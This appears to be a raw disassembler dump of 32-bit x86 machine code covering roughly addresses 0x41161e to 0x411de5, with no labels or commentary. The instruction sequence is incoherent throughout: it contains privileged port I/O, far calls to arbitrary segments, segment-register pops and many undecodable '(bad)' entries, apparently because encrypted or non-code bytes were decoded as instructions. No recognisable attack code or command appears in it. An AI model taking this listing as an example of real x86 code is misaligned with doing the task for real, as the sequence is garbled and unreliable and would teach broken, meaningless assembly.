  41161e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41161f:	mov    bl,0x41
  411621:	xor    DWORD PTR [ecx-0x36437337],0xa33feb2b
  41162b:	mov    bh,0x46
  41162d:	sar    DWORD PTR [edi-0x5545a119],0x8e
  411634:	test   DWORD PTR [edx-0x19],esi
  411637:	xor    DWORD PTR es:[ecx-0x669ea21a],ebp
  41163e:	inc    esi
  41163f:	and    BYTE PTR [eax+0x58],0x41
  411643:	mov    ebx,0x769e4aca
  411648:	lahf   
  411649:	stos   DWORD PTR es:[edi],eax
  41164a:	push   edi
  41164b:	xor    al,0xb8
  41164d:	gs xlat BYTE PTR fs:[ebx]
  411650:	sbb    eax,0x8d39954f
  411655:	aas    
  411656:	iret   
  411657:	fisttp QWORD PTR [ecx-0x791eb078]
  41165d:	jb     0x4116b6
  41165f:	in     eax,0xf2
  411661:	jecxz  0x411693
  411663:	pop    ss
  411664:	cdq    
  411665:	xor    ebp,edx
  411667:	dec    eax
  411668:	jp     0x41169f
  41166a:	cmc    
  41166b:	inc    ebx
  41166c:	cmp    dh,dh
  41166e:	iret   
  41166f:	out    0x2a,al
  411671:	xchg   ecx,eax
  411672:	cmp    al,0xbc
  411674:	es jg  0x4116d0
  411677:	adc    ch,BYTE PTR [ebx+0xeae690f]
  41167d:	test   eax,0xbfc9ffd8
  411682:	jg     0x4116d8
  411684:	imul   ecx,DWORD PTR [esi],0xd48ae897
  41168a:	pusha  
  41168b:	clc    
  41168c:	or     BYTE PTR [ebx+ebx*4+0x7a38ea9f],cl
  411693:	cdq    
  411694:	pop    edi
  411695:	pop    ecx
  411696:	push   eax
  411697:	mov    dh,0xec
  411699:	sub    BYTE PTR [ebx+0x0],0x18
  41169d:	jo     0x4116f0
  41169f:	aas    
  4116a0:	add    ah,BYTE PTR [eax]
  4116a2:	pop    eax
  4116a3:	ffreep st(2)
  4116a5:	jae    0x4116b4
  4116a7:	push   ss
  4116a8:	in     eax,dx
  4116a9:	fild   WORD PTR [edi+0x4]
  4116ac:	call   0x9748:0xec76969a
  4116b3:	lods   eax,DWORD PTR ds:[esi]
  4116b4:	sar    BYTE PTR [edi-0x422a0caf],0x68
  4116bb:	mov    eax,ds:0x9f6998f7
  4116c0:	inc    eax
  4116c1:	sbb    dh,0xc8
  4116c4:	inc    ecx
  4116c5:	add    BYTE PTR [ebx],bl
  4116c7:	mov    eax,ds:0xb5949330
  4116cc:	cld    
  4116cd:	stos   DWORD PTR es:[edi],eax
  4116ce:	icebp  
  4116cf:	push   edi
  4116d0:	fwait
  4116d1:	xor    BYTE PTR [edx-0x63bfd932],dl
  4116d7:	mov    ecx,0xaf5ba9bd
  4116dc:	pop    ss
  4116dd:	clc    
  4116de:	pop    edx
  4116df:	inc    eax
  4116e0:	pop    es
  4116e1:	sbb    eax,DWORD PTR [edx+0x75b2a08]
  4116e7:	sub    DWORD PTR es:[edi+esi*1],ecx
  4116eb:	mov    ds:0xb0deb197,eax
  4116f0:	std    
  4116f1:	sbb    al,BYTE PTR [esi-0x44]
  4116f4:	loope  0x4116c5
  4116f6:	cmc    
  4116f7:	jae    0x411750
  4116f9:	mov    ds:0xe5f0daba,al
  4116fe:	loopne 0x411770
  411700:	out    dx,al
  411701:	xor    eax,DWORD PTR [eax+0x3b3304ce]
  411707:	push   0xb828648e
  41170c:	repz in al,0x1a
  41170f:	loope  0x411716
  411711:	sahf   
  411712:	int    0xbc
  411714:	mov    dl,0x8c
  411716:	add    dh,BYTE PTR [ecx+0x62]
  411719:	push   edx
  41171a:	jae    0x4116fe
  41171c:	inc    esi
  41171d:	adc    DWORD PTR [edi-0xcc34728],edx
  411723:	xor    cl,BYTE PTR [ebp-0x233cfd0f]
  411729:	leave  
  41172a:	test   DWORD PTR [ecx+0x6c],esp
  41172d:	imul   ebp,DWORD PTR [ecx],0xffffffb4
  411730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411731:	mov    ebp,0xa8328696
  411736:	or     ecx,esp
  411738:	dec    ebp
  411739:	aam    0x59
  41173b:	cld    
  41173c:	pop    esi
  41173d:	pop    ebx
  41173e:	cmp    eax,0xb0564582
  411743:	mov    es,WORD PTR [eax+0x304d876a]
  411749:	fistp  WORD PTR [edi-0x78f44623]
  41174f:	fild   DWORD PTR [ebx]
  411751:	mov    WORD PTR [ebp+eiz*2-0x28c18e4d],?
  411758:	(bad)  
  411759:	lock push edi
  41175b:	cmp    cl,dl
  41175d:	xor    ebx,DWORD PTR [ebp+0x3305ee25]
  411763:	inc    eax
  411764:	pop    es
  411765:	fidiv  DWORD PTR [ebx+0x3a]
  411768:	or     cl,BYTE PTR [esi+edi*8-0x5a]
  41176c:	mov    bh,0xff
  41176e:	cmp    edx,DWORD PTR cs:[esi+0x3c]
  411772:	ins    BYTE PTR es:[edi],dx
  411773:	adc    DWORD PTR [edx],ebx
  411775:	jnp    0x4117ba
  411777:	jmp    0x5027eaf2
  41177c:	bound  ebp,QWORD PTR [ebp+0x3]
  41177f:	mov    bh,0x8c
  411781:	push   esi
  411782:	cwde   
  411783:	mov    dh,0xac
  411785:	mov    edi,0xd3200a0
  41178a:	lea    ebx,[edx+edi*1]
  41178d:	(bad)  [edx]
  41178f:	repz inc edi
  411791:	jb     0x411751
  411793:	dec    eax
  411794:	adc    DWORD PTR [esi-0xc7dd03],0x17608fd1
  41179e:	inc    ecx
  41179f:	das    
  4117a0:	ja     0x4117ff
  4117a2:	es enter 0x3e2,0x5f
  4117a7:	xor    cl,al
  4117a9:	sub    eax,0x15aaf8a9
  4117ae:	call   0xa2cc:0x4e7882c6
  4117b5:	test   BYTE PTR [ebp-0x634b5916],dh
  4117bb:	or     dl,BYTE PTR [ebx-0x70]
  4117be:	xlat   BYTE PTR ds:[ebx]
  4117bf:	adc    al,0xa6
  4117c1:	mov    ecx,DWORD PTR [esi+eax*2]
  4117c4:	sahf   
  4117c5:	in     al,dx
  4117c6:	adc    ah,BYTE PTR [esi-0x2ad2beeb]
  4117cc:	sub    ecx,DWORD PTR [ebp-0x22b33dd8]
  4117d2:	cwde   
  4117d3:	mov    ch,0x79
  4117d5:	xchg   edi,eax
  4117d6:	frstor [edi-0x26]
  4117d9:	jns    0x4117ce
  4117db:	pop    eax
  4117dc:	mov    dh,0xac
  4117de:	push   ss
  4117df:	mov    esi,ebx
  4117e1:	mov    esp,0xfa3b7d0d
  4117e6:	(bad)  
  4117e8:	mov    WORD PTR [edi+0x54],ds
  4117eb:	pop    ss
  4117ec:	shr    BYTE PTR [eax],1
  4117ee:	mov    eax,ds:0xcfe789d4
  4117f3:	add    al,0x94
  4117f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117f6:	cmc    
  4117f7:	loop   0x41177a
  4117f9:	mov    WORD PTR [esi-0x23becf59],cs
  4117ff:	xlat   BYTE PTR ds:[ebx]
  411800:	shr    DWORD PTR gs:[ebx+0x5d],0x6b
  411805:	xchg   esi,eax
  411806:	repnz popf 
  411808:	(bad)  
  411809:	sti    
  41180a:	shl    DWORD PTR [ebx+0xcf76840],0x94
  411811:	cmp    BYTE PTR [esi-0x45e783ef],ch
  411817:	fidiv  DWORD PTR [ebx+ecx*2]
  41181a:	and    eax,DWORD PTR [ebp-0x3b26f1c0]
  411820:	repz mov esp,0x28fb10d3
  411826:	mov    ecx,0xcf1f60d5
  41182b:	xlat   BYTE PTR ds:[ebx]
  41182c:	and    edx,DWORD PTR [esi+0x35]
  41182f:	mov    ah,0x37
  411831:	ss add ch,cl
  411834:	aas    
  411835:	aam    0xe4
  411837:	mov    esi,0x10d1bdca
  41183c:	repnz out 0x10,eax
  41183f:	arpl   WORD PTR [ecx+0x67ea6d7b],si
  411845:	ins    DWORD PTR es:[edi],dx
  411846:	inc    ebp
  411847:	jnp    0x411873
  411849:	cld    
  41184a:	int3   
  41184b:	pop    es
  41184c:	push   es
  41184d:	mov    eax,ds:0x935b4aac
  411852:	push   cs
  411853:	arpl   WORD PTR [eax-0x13d25b52],sp
  411859:	iret   
  41185a:	xor    edi,DWORD PTR ds:0x14f0ac18
  411860:	mov    edi,edx
  411862:	arpl   WORD PTR [ecx],cx
  411864:	fimul  DWORD PTR [edx-0x2f8b5c28]
  41186a:	jb     0x411877
  41186c:	or     al,0x9c
  41186e:	test   al,0x39
  411870:	sub    ecx,edx
  411872:	mov    esi,0xfa2b9b85
  411877:	or     edi,ecx
  411879:	cld    
  41187a:	(bad)  
  41187b:	call   0x1a212f0f
  411880:	push   ebx
  411881:	inc    ecx
  411882:	fwait
  411883:	inc    eax
  411884:	or     ebp,DWORD PTR [eax-0x42]
  411887:	jl     0x4118e9
  411889:	push   ss
  41188a:	nop
  41188b:	daa    
  41188c:	int    0xb3
  41188e:	in     eax,0x3b
  411890:	out    dx,eax
  411891:	dec    edi
  411892:	popf   
  411893:	push   esp
  411894:	leave  
  411895:	sbb    eax,0xf3181df5
  41189a:	jge    0x4118d0
  41189c:	ret    
  41189d:	mov    DWORD PTR [edi],ebp
  41189f:	push   cs
  4118a0:	add    edx,DWORD PTR [eax+0x6a]
  4118a3:	imul   dl
  4118a5:	sbb    edi,DWORD PTR [esp+edx*4+0x1bdbe766]
  4118ac:	ret    0x704a
  4118af:	or     ecx,DWORD PTR [esi+0x2a5069e6]
  4118b5:	pop    ds
  4118b6:	lock jno 0x41185d
  4118b9:	push   ds
  4118ba:	push   ebp
  4118bb:	int    0x8e
  4118bd:	imul   ebx,DWORD PTR [edx+esi*8],0xfffffff5
  4118c1:	int3   
  4118c2:	inc    ebx
  4118c3:	jb     0x4118e2
  4118c5:	div    DWORD PTR [ecx-0x10]
  4118c8:	(bad)  
  4118c9:	test   DWORD PTR [ebx+0xa],ebp
  4118cc:	push   edx
  4118cd:	xchg   ebp,eax
  4118ce:	loope  0x4118c2
  4118d0:	loopne 0x411914
  4118d2:	xor    al,0x82
  4118d4:	add    BYTE PTR [edx],ch
  4118d6:	xchg   DWORD PTR [ebp+0x64],eax
  4118d9:	sahf   
  4118da:	pop    es
  4118db:	xor    al,0x75
  4118dd:	scas   eax,DWORD PTR es:[edi]
  4118de:	imul   eax,DWORD PTR [eax+0x46b8b4ce],0xa3d9defd
  4118e8:	jae    0x41187d
  4118ea:	pop    ebp
  4118eb:	jnp    0x4118be
  4118ed:	sbb    DWORD PTR [eax],ebx
  4118ef:	in     eax,dx
  4118f0:	and    BYTE PTR [esi+0x5bf0b1d4],bl
  4118f6:	or     al,0xcd
  4118f8:	int3   
  4118f9:	push   ebp
  4118fa:	call   0xb90d0b6a
  4118ff:	xor    BYTE PTR [edx+0x44],bh
  411902:	adc    DWORD PTR [esi+0x365ce000],ecx
  411908:	adc    bh,ch
  41190a:	mov    BYTE PTR [ebx+0x3d16784c],dl
  411910:	loop   0x4118f6
  411912:	push   eax
  411913:	pop    esp
  411914:	push   ebx
  411915:	(bad)  
  411916:	addr16 dec esp
  411918:	mov    ebp,0xedeae04b
  41191d:	jnp    0x411913
  41191f:	popf   
  411920:	es stc 
  411922:	push   edi
  411923:	ins    BYTE PTR es:[edi],dx
  411924:	or     ch,BYTE PTR [ecx+0x1a]
  411927:	or     bl,BYTE PTR [edi]
  411929:	xchg   ebp,eax
  41192a:	add    al,0x65
  41192c:	sar    DWORD PTR [bx+di+0x7d],1
  411930:	mov    edi,0x6a85ab47
  411935:	xchg   esi,eax
  411936:	pop    esi
  411937:	popf   
  411938:	sahf   
  411939:	adc    ebx,DWORD PTR [edi+0x7f1fe3a9]
  41193f:	inc    esp
  411940:	jl     0x41191f
  411942:	mov    cl,0xa4
  411944:	push   ebp
  411945:	pusha  
  411946:	or     BYTE PTR [edi-0x5],ch
  411949:	outs   dx,DWORD PTR ds:[esi]
  41194a:	xchg   ecx,eax
  41194b:	sbb    esp,DWORD PTR [eax+0x2b]
  41194e:	in     al,0x79
  411950:	pushf  
  411951:	sbb    al,0xee
  411953:	imul   esi,DWORD PTR ds:0x835b0909,0xffffffbe
  41195a:	sbb    ecx,DWORD PTR [ebx]
  41195c:	mov    cs,WORD PTR [eax-0x1e219a38]
  411962:	sbb    al,0xbd
  411964:	in     al,dx
  411965:	scas   eax,DWORD PTR es:[edi]
  411966:	test   BYTE PTR [eax],ch
  411968:	jmp    0xf9d3073e
  41196d:	pop    es
  41196e:	out    dx,eax
  41196f:	xor    eax,0xbe145dc5
  411974:	add    DWORD PTR [esi+0xd2e8891],ebx
  41197a:	dec    ebp
  41197b:	adc    esi,DWORD PTR [ecx-0x6ca9a89e]
  411981:	ret    
  411982:	and    edx,esp
  411984:	in     al,0xe
  411986:	xchg   esp,eax
  411987:	loopne 0x4119a6
  411989:	mov    cl,0xb0
  41198b:	pop    ecx
  41198c:	push   edx
  41198d:	pop    ecx
  41198e:	push   cs
  41198f:	bound  ebp,QWORD PTR [esi+0xc50b9eb]
  411995:	sbb    bl,BYTE PTR [eax-0x66ca5037]
  41199b:	sub    BYTE PTR [eax+0x41658380],0xe1
  4119a2:	sub    bl,ch
  4119a4:	mov    edi,0xf4631122
  4119a9:	repnz sbb eax,0xfbf9b1a0
  4119af:	and    al,0xdd
  4119b1:	sub    al,BYTE PTR [esi-0x5]
  4119b4:	stos   DWORD PTR es:[edi],eax
  4119b5:	sub    BYTE PTR [esi+0x61],cl
  4119b8:	sub    eax,0x6f91313a
  4119bd:	pop    ss
  4119be:	fwait
  4119bf:	and    al,BYTE PTR [edx+0x1914a46a]
  4119c5:	and    eax,0xed618c34
  4119ca:	inc    esi
  4119cb:	mov    eax,ds:0x48042c0f
  4119d0:	aam    0xc8
  4119d2:	adc    eax,0xa1737e02
  4119d7:	jge    0x411997
  4119d9:	jno    0x411a42
  4119db:	mov    ebx,0xf625d750
  4119e0:	fsubr  QWORD PTR [edi+0x6d]
  4119e3:	popa   
  4119e4:	aaa    
  4119e5:	push   es
  4119e6:	and    DWORD PTR ds:0x410682c1,esi
  4119ec:	xchg   esi,eax
  4119ed:	or     DWORD PTR [eax-0x1e],ebp
  4119f0:	push   ds
  4119f1:	pop    ss
  4119f2:	pop    ss
  4119f3:	mov    bh,0xe7
  4119f5:	pop    es
  4119f6:	aad    0x9f
  4119f8:	add    BYTE PTR [eax+0xf17b787],dl
  4119fe:	or     eax,0x96ca742f
  411a03:	mov    cl,0x1a
  411a05:	retf   0xf6ee
  411a08:	push   ss
  411a09:	sub    DWORD PTR [ebp+0x3],ebp
  411a0c:	out    0xc5,al
  411a0e:	icebp  
  411a0f:	dec    esi
  411a10:	or     BYTE PTR [esi],dh
  411a12:	and    ah,BYTE PTR [ecx]
  411a14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a15:	adc    eax,0x9d50a2cc
  411a1a:	dec    esp
  411a1b:	pop    ds
  411a1c:	loopne 0x411a3f
  411a1e:	push   es
  411a1f:	pop    ebx
  411a20:	aam    0xba
  411a22:	test   BYTE PTR [edi-0x4a],ah
  411a25:	xchg   esi,eax
  411a26:	and    eax,0x4663100f
  411a2b:	inc    ecx
  411a2c:	sahf   
  411a2d:	icebp  
  411a2e:	mov    DWORD PTR [ebx-0x4f],eax
  411a31:	inc    eax
  411a32:	lahf   
  411a33:	jae    0x411a85
  411a35:	inc    DWORD PTR [edi]
  411a37:	je     0x411a58
  411a39:	rcr    DWORD PTR ds:0xc402ceb3,1
  411a3f:	das    
  411a40:	dec    edi
  411a41:	adc    esp,DWORD PTR [esi+0x3c]
  411a44:	not    BYTE PTR [esi-0xee286f1]
  411a4a:	pop    ss
  411a4b:	daa    
  411a4c:	je     0x411a4d
  411a4e:	(bad)  
  411a4f:	pop    esi
  411a50:	mov    ds:0xc223cd2c,eax
  411a55:	push   edi
  411a56:	std    
  411a57:	xchg   DWORD PTR [esi-0x856cf32],ebx
  411a5d:	inc    esi
  411a5e:	dec    ebx
  411a5f:	repz addr16 int 0x92
  411a63:	mov    dh,al
  411a65:	cmp    DWORD PTR [eax],esi
  411a67:	adc    BYTE PTR [edx],bl
  411a69:	pop    esp
  411a6a:	jbe    0x411aa1
  411a6c:	jnp    0x411a9d
  411a6e:	js     0x411a73
  411a70:	rcl    BYTE PTR [ebx-0x4b772783],cl
  411a76:	inc    edi
  411a77:	or     al,0x8f
  411a79:	mov    bh,0xb1
  411a7b:	cwde   
  411a7c:	pop    ecx
  411a7d:	mov    cl,0x78
  411a7f:	sahf   
  411a80:	jno    0x411a59
  411a82:	jle    0x411a66
  411a84:	jge    0x411a79
  411a86:	fs ja  0x411a3a
  411a89:	mov    ebp,0xc42d2dd1
  411a8e:	scas   al,BYTE PTR es:[edi]
  411a8f:	sahf   
  411a90:	ret    0x827b
  411a93:	xchg   edx,eax
  411a94:	xor    ch,BYTE PTR [ecx]
  411a96:	or     bh,dl
  411a98:	and    BYTE PTR ds:0xc053d390,cl
  411a9e:	xor    eax,DWORD PTR [esi]
  411aa0:	push   0xffffff8e
  411aa2:	cmp    DWORD PTR [edi-0x640729aa],esp
  411aa8:	sub    eax,0x39628884
  411aad:	or     BYTE PTR [eax+0x1e],dl
  411ab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ab1:	or     ch,BYTE PTR [esi-0x37e39804]
  411ab7:	fnstenv cs:[esi+ecx*8]
  411abb:	sbb    DWORD PTR [edi+eax*8],edx
  411abe:	ret    
  411abf:	outs   dx,BYTE PTR ds:[esi]
  411ac0:	sub    ebp,esi
  411ac2:	inc    ebp
  411ac3:	push   DWORD PTR [esi+0x76ee026c]
  411ac9:	xor    BYTE PTR [edi+0x14],ch
  411acc:	test   BYTE PTR [ecx-0x675d3b72],bh
  411ad2:	add    al,0x24
  411ad4:	jl     0x411a9c
  411ad6:	retf   0x5d75
  411ad9:	scas   al,BYTE PTR es:[edi]
  411ada:	cmp    al,0x4c
  411adc:	xor    eax,0x5d365ed5
  411ae1:	pop    eax
  411ae2:	inc    eax
  411ae3:	in     al,0xe7
  411ae5:	ja     0x411a8a
  411ae7:	jg     0x411b56
  411ae9:	enter  0xe990,0xba
  411aed:	call   DWORD PTR [esi+eax*4+0x29]
  411af1:	test   BYTE PTR [ebp+0x51],bh
  411af4:	popf   
  411af5:	sbb    DWORD PTR [di+0x37],ebp
  411af9:	mov    ebx,0x1eacb973
  411afe:	push   esi
  411aff:	jge    0x411b5c
  411b01:	add    DWORD PTR [esi],esi
  411b03:	mov    eax,0x51e02f44
  411b08:	cmp    BYTE PTR [eax-0x1],dl
  411b0b:	in     al,dx
  411b0c:	fwait
  411b0d:	dec    esp
  411b0e:	inc    edi
  411b0f:	jae    0x411aa5
  411b11:	mov    ebp,0x48136d02
  411b16:	ss stos DWORD PTR es:[edi],eax
  411b18:	mov    dh,0x14
  411b1a:	mov    BYTE PTR [edx+edx*1],ah
  411b1d:	scas   eax,DWORD PTR es:[edi]
  411b1e:	dec    esi
  411b1f:	and    bh,BYTE PTR [ebp-0x66a9bc92]
  411b25:	adc    DWORD PTR [ebp-0x5c9d4b9f],ebp
  411b2b:	inc    edx
  411b2c:	mov    ebx,gs
  411b2e:	out    dx,eax
  411b2f:	into   
  411b30:	push   es
  411b31:	mov    ?,WORD PTR [edi+0x28]
  411b34:	jge    0x411b9a
  411b36:	js     0x411adf
  411b38:	ret    
  411b39:	js     0x411ae4
  411b3b:	pop    edx
  411b3c:	inc    edx
  411b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b3e:	pop    edx
  411b3f:	imul   ecx,DWORD PTR [ecx+0x34410cb0],0x9ecaa6ed
  411b49:	mov    ds:0xaf1b9a0c,eax
  411b4e:	mov    dh,BYTE PTR [ebx]
  411b50:	ins    DWORD PTR es:[edi],dx
  411b51:	push   esi
  411b52:	xor    ecx,DWORD PTR [ebx+ecx*4+0x681e2334]
  411b59:	xor    al,0x96
  411b5b:	das    
  411b5c:	test   bl,dh
  411b5e:	inc    edx
  411b5f:	push   esp
  411b60:	or     eax,0xc8659779
  411b65:	inc    edx
  411b66:	mov    dl,BYTE PTR [edi-0x31370b64]
  411b6c:	sbb    cl,BYTE PTR [ebp-0x21c7f7b8]
  411b72:	cmp    BYTE PTR [eax-0x7e07cdc9],ah
  411b78:	les    edx,FWORD PTR [ebp-0x6b677090]
  411b7e:	pop    esi
  411b7f:	inc    edx
  411b80:	imul   esi,DWORD PTR [edx],0x66
  411b83:	fcom   DWORD PTR [ebx+eiz*4+0x79]
  411b87:	cli    
  411b88:	stos   DWORD PTR es:[edi],eax
  411b89:	xor    esi,DWORD PTR [eax-0xe]
  411b8c:	mov    cs,WORD PTR [ebp-0x579a606]
  411b92:	pop    edx
  411b93:	lea    ebp,[esi+0x71]
  411b96:	imul   edx,DWORD PTR [esi+esi*1+0x12],0xffffffb2
  411b9b:	into   
  411b9c:	addr16 jo 0x411c1d
  411b9f:	mov    BYTE PTR [ecx+ebp*1],al
  411ba2:	fwait
  411ba3:	cmp    ah,BYTE PTR [ebx-0x14ddc4c8]
  411ba9:	jl     0x411b60
  411bab:	jns    0x411b3f
  411bad:	cmp    edx,DWORD PTR [ecx+0x13a7019a]
  411bb3:	mov    ds,WORD PTR [ecx-0x5f38c8a8]
  411bb9:	push   esp
  411bba:	xor    ecx,0x21
  411bbd:	mov    edx,0x6bd5cab5
  411bc2:	pushf  
  411bc3:	push   cs
  411bc4:	popf   
  411bc5:	add    dl,BYTE PTR [ebp+0x14]
  411bc8:	mov    ds:0xe1c4a6e9,al
  411bcd:	shl    DWORD PTR [edi+0x17d98929],cl
  411bd3:	rcl    BYTE PTR [edi-0x4a63fe76],1
  411bd9:	jl     0x411ba1
  411bdb:	jb     0x411bdd
  411bdd:	xor    DWORD PTR [edx+0x7a39fd1f],0x18
  411be4:	mov    al,0x93
  411be6:	in     eax,0xb8
  411be8:	xor    edx,DWORD PTR [eax+edi*1-0x446c4fe]
  411bef:	dec    ebp
  411bf0:	outs   dx,DWORD PTR ds:[esi]
  411bf1:	popa   
  411bf2:	das    
  411bf3:	pop    ebp
  411bf4:	imul   edx,DWORD PTR [edx+0x9],0xbb5ca54a
  411bfb:	cmp    dh,0xb6
  411bfe:	adc    ch,BYTE PTR [edx]
  411c00:	mov    al,ds:0xc87e6c0c
  411c05:	inc    ebx
  411c06:	inc    ebp
  411c07:	aam    0xc8
  411c09:	mov    ds:0x2dbcb3d6,eax
  411c0e:	adc    DWORD PTR [edx+ecx*4-0x371f58f0],eax
  411c15:	dec    esi
  411c16:	cvtpi2ps xmm4,QWORD PTR [esi+0x14]
  411c1a:	ret    
  411c1b:	cmc    
  411c1c:	sub    edx,edi
  411c1e:	aad    0xb
  411c20:	addr16 jle 0x411c4b
  411c23:	fdivp  st(3),st
  411c25:	pop    ebp
  411c26:	je     0x411bc0
  411c28:	add    ebx,esp
  411c2a:	jno    0x411c0e
  411c2c:	dec    esp
  411c2d:	pop    esp
  411c2e:	jae    0x411c56
  411c30:	add    eax,0x9dc50272
  411c35:	scas   eax,DWORD PTR es:[edi]
  411c36:	int    0x29
  411c38:	cwde   
  411c39:	bswap  ebp
  411c3b:	add    BYTE PTR [edi-0x4f],al
  411c3e:	jbe    0x411cba
  411c40:	mov    bl,BYTE PTR [esi]
  411c42:	cmp    DWORD PTR [ebp-0x68],ecx
  411c45:	ret    0x420a
  411c48:	mov    al,ds:0x31eb3bc7
  411c4d:	call   0xbfac:0x5b471e4d
  411c54:	ins    BYTE PTR es:[edi],dx
  411c55:	jno    0x411c11
  411c57:	push   esp
  411c58:	popf   
  411c59:	cld    
  411c5a:	pop    ss
  411c5b:	sahf   
  411c5c:	mov    ah,0xb4
  411c5e:	stos   DWORD PTR es:[edi],eax
  411c5f:	lds    edi,FWORD PTR [edx]
  411c61:	mov    ds:0x4dbe9da,eax
  411c66:	xchg   edi,eax
  411c67:	jnp    0x411bfb
  411c69:	pop    ebp
  411c6a:	data16 and ch,0xec
  411c6e:	mov    esi,0x52f9aaa3
  411c73:	into   
  411c74:	dec    edx
  411c75:	sahf   
  411c76:	stc    
  411c77:	push   esp
  411c78:	cld    
  411c79:	pop    ebp
  411c7a:	out    0xf6,eax
  411c7c:	sbb    al,0x43
  411c7e:	adc    DWORD PTR [esi],ecx
  411c80:	mov    edx,0x59876b0e
  411c85:	aad    0xb7
  411c87:	out    0xfe,al
  411c89:	add    eax,0xdc645032
  411c8e:	sbb    al,0x6f
  411c90:	ja     0x411c44
  411c92:	(bad)  
  411c93:	in     eax,0xcd
  411c95:	adc    BYTE PTR [esi-0x5d],bl
  411c98:	cdq    
  411c99:	or     DWORD PTR [ebp-0x7e0b6926],eax
  411c9f:	enter  0x60ed,0x4
  411ca3:	cmp    al,0x70
  411ca5:	dec    ebp
  411ca6:	inc    DWORD PTR [eax-0xe]
  411ca9:	aad    0x52
  411cab:	dec    edi
  411cac:	cmc    
  411cad:	mov    esp,0x95281047
  411cb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cb3:	sbb    eax,esi
  411cb5:	jmp    0x514:0xfadd6f3b
  411cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cbd:	fistp  DWORD PTR ds:0x6508f622
  411cc3:	pop    ds
  411cc4:	(bad)  
  411cc5:	(bad)  
  411cc7:	jmp    0xe6902725
  411ccc:	dec    edx
  411ccd:	mov    al,ds:0xd766a7b4
  411cd2:	mov    ecx,DWORD PTR [eax+edi*8+0x5ffa6999]
  411cd9:	cmova  esp,esi
  411cdc:	fs pop ecx
  411cde:	jg     0x411c85
  411ce0:	pop    edi
  411ce1:	scas   al,BYTE PTR es:[edi]
  411ce2:	ret    
  411ce3:	push   esp
  411ce4:	lods   al,BYTE PTR ds:[esi]
  411ce5:	pavgb  mm2,QWORD PTR [ecx+0x2c21f80a]
  411cec:	rcl    BYTE PTR [ecx+0x55],cl
  411cef:	xchg   esi,eax
  411cf0:	mov    bl,0x42
  411cf2:	pop    edx
  411cf3:	sbb    bl,BYTE PTR [ebp+0x144a3ee9]
  411cf9:	and    eax,0x1bab8ada
  411cfe:	imul   edi,DWORD PTR [ecx],0xa96a939
  411d04:	xchg   esp,eax
  411d05:	je     0x411d5b
  411d07:	sbb    BYTE PTR [eax+0x1735f5a5],ch
  411d0d:	fwait
  411d0e:	cmp    al,0xfd
  411d10:	shl    BYTE PTR [ebx+0x77],cl
  411d13:	jmp    0x8b3459d9
  411d18:	(bad)  
  411d19:	xor    DWORD PTR [esi+0x4dd24c7d],ebp
  411d1f:	adc    cl,dl
  411d21:	lahf   
  411d22:	mov    cl,dh
  411d24:	jmp    0x411cb4
  411d26:	arpl   WORD PTR ss:[edi],dx
  411d29:	pop    ss
  411d2a:	hlt    
  411d2b:	pop    es
  411d2c:	mov    ds:0xd94e9d00,eax
  411d31:	test   BYTE PTR [eax-0x2752d251],0xf3
  411d38:	inc    edx
  411d39:	sub    edx,DWORD PTR [edi]
  411d3b:	sti    
  411d3c:	out    dx,eax
  411d3d:	xchg   eax,esp
  411d3f:	push   eax
  411d40:	stos   DWORD PTR es:[edi],eax
  411d41:	pop    es
  411d42:	sub    BYTE PTR [ecx],cl
  411d44:	js     0x411d84
  411d46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d47:	push   cs
  411d48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d49:	mul    DWORD PTR [ebx-0x7312763c]
  411d4f:	mov    eax,ds:0x30ea2ba0
  411d54:	aaa    
  411d55:	popf   
  411d56:	shr    BYTE PTR [esi],1
  411d58:	call   0xfc184c0d
  411d5d:	std    
  411d5e:	xchg   ebx,eax
  411d5f:	push   ecx
  411d60:	push   ebx
  411d61:	lmsw   si
  411d64:	out    dx,al
  411d65:	pop    esp
  411d66:	ins    BYTE PTR es:[edi],dx
  411d67:	test   al,0xba
  411d69:	adc    al,0xe1
  411d6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d6c:	jp     0x411d49
  411d6e:	xor    al,0x85
  411d70:	cld    
  411d71:	retf   0x40f3
  411d74:	mov    al,BYTE PTR [ebx]
  411d76:	xchg   esp,eax
  411d77:	sub    eax,0xf772b318
  411d7c:	sub    BYTE PTR [ecx+0x6],al
  411d7f:	retf   
  411d80:	or     ecx,DWORD PTR [ebx+0x42b6f4f9]
  411d86:	jge    0x411d1a
  411d88:	(bad)  [eax-0x7f]
  411d8b:	inc    ecx
  411d8c:	inc    edx
  411d8d:	inc    edi
  411d8e:	lahf   
  411d8f:	(bad)  
  411d90:	fnsave ds:0x536145f5
  411d96:	xor    al,0xc9
  411d98:	or     ebx,DWORD PTR [edx]
  411d9a:	dec    edx
  411d9b:	mov    ebx,0x2c45bcc3
  411da0:	dec    ebx
  411da1:	sub    al,0x85
  411da3:	xchg   edi,eax
  411da4:	mov    esi,0x6d729fb5
  411da9:	clc    
  411daa:	ja     0x411d68
  411dac:	mov    esi,0xaeacc358
  411db1:	push   es
  411db2:	and    al,0xfc
  411db4:	jmp    0x411dd7
  411db6:	mov    gs,ebp
  411db8:	icebp  
  411db9:	mov    bh,0x1
  411dbb:	dec    eax
  411dbc:	aas    
  411dbd:	push   ds
  411dbe:	out    dx,al
  411dbf:	jno    0x411d49
  411dc1:	adc    dl,dh
  411dc3:	repnz mov eax,gs
  411dc6:	aad    0xde
  411dc8:	jge    0x411e14
  411dca:	imul   esi,DWORD PTR [ebx],0x6dbfccec
  411dd0:	push   edi
  411dd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dd2:	dec    eax
  411dd3:	or     ebp,DWORD PTR [ecx+esi*2+0x55]
  411dd7:	dec    edx
  411dd8:	cmp    BYTE PTR [edx+0x25],0xc
  411ddc:	jo     0x411d8c
  411dde:	inc    edx
  411ddf:	cmp    eax,0xb069608e
  411de4:	dec    eax
  411de5:	and    BYTE PTR [edx],dh
